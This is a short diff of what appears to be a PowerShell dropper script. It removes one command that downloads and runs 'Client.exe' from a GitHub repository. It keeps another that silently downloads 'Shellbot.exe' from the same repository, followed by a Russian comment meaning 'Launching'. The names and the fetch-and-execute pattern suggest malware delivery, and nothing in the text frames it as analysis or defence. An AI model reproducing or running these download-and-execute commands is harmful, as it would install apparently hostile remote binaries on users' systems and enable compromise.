@@ -1,5 +1,3 @@
-Invoke-WebRequest -Uri "https://github.com/kilordow/nowika/raw/refs/heads/main/Client.exe" -OutFile "Client.exe"; .\Client.exe
-
 Invoke-WebRequest -Uri "https://github.com/kilordow/nowika/raw/refs/heads/main/Shellbot.exe" -OutFile "Shellbot.exe" -ErrorAction SilentlyContinue
     
     # Запускаем 
